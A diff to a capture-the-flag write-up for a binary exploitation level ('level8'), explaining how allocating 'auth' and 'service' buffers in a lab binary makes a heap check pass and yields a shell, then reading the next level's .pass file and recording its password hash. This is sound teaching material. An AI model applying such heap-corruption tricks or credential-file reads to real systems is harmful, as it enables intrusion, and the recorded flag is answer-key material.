@@ -11,7 +11,7 @@ Usage: ./main.sh
 |        |                                                                    |
 | ------ | ------------------------------------------------------------------ |
 | level8 | `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9` |
-| level9 | ``                                                                 |
+| level9 | `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a` |
 
 ## Steps to resolve on VM
 
@@ -37,22 +37,65 @@ Lets debug the binary
 
 See our assembly interpretation in [source file](../source.c)
 
-```
-objdump -t level8 | grep auth
-> 08049aac g     O .bss   00000004              auth
-objdump -t level8 | grep service
-> 08049ab0 g     O .bss   00000004              service
+To access to the new access, the byte at `*auth + 0x20` has to be not null.
 
+It means `0x804a008 + 0x20` => `0x804a028` has to be not null
+
+First we have to define `auth`:
+
+```shell
+~/level8
+> (nil), (nil) # auth, service
+auth a
+> 0x804a008, (nil)  # auth, service
+```
+
+Malloc returns a pointer to `0x804a008`
+
+If the input is "service", it calls `strdup` and allocates a new part of memory.
+
+```shell
+service
+> 0x804a008, 0x804a018  # auth, service
+```
+
+The pointer `service` aims to 0x804a018.
+
+Two solutions:
+
+- either allocate a new part of memory starting at `0x804a028` using `strdup`:
+
+```shell
+> 0x804a008, 0x804a018  # auth, service
+service
+> 0x804a008, 0x804a028 # auth, service
+login
+$ # here the shell is
+```
+
+- _(after restart ./level8 to set `service` at `null`)_ <br />
+  or write a string big enough to erase the address `0x804a028`: (`0x804a028 - 0x804a010 = 0x10` => 16 bytes)
+
+```shell
+> 0x804a008, (nil)  # auth, service
+service0123456789abcdef
+> 0x804a008, 0x804a028 # auth, service
+login
+$ # here the shell is
+```
+
+Finally we can get the pass !
+
+```shell
+$ whoami
+> level9
+$ cat /home/user/level9/.pass
+> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
 
 ---
 
 ## Sources
-
-### Format string vulnerability
-
-- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
-- [FR - Buffer overflow](https://beta.hackndo.com/buffer-overflow/)
 
 ### ASM
 
@@ -71,3 +114,7 @@ objdump -t level8 | grep service
 - [Man strcpy](https://linux.die.net/man/3/strcpy)
 - [Man strdup](https://linux.die.net/man/3/strdup)
 - [Man system](https://linux.die.net/man/3/system)
+
+```
+
+```
